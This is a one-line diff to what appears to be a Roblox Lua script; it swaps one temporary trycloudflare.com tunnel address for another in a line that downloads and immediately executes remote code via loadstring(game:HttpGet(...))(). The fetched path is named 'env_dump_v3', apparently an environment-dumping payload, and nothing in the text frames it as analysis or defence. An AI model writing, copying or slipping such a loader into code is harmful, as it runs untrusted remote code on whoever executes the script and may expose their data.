@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://aim-summer-evening-occupied.trycloudflare.com/env_dump_v3"))()
+loadstring(game:HttpGet("https://elements-raleigh-pennsylvania-shareholders.trycloudflare.com/env_dump_v3"))()
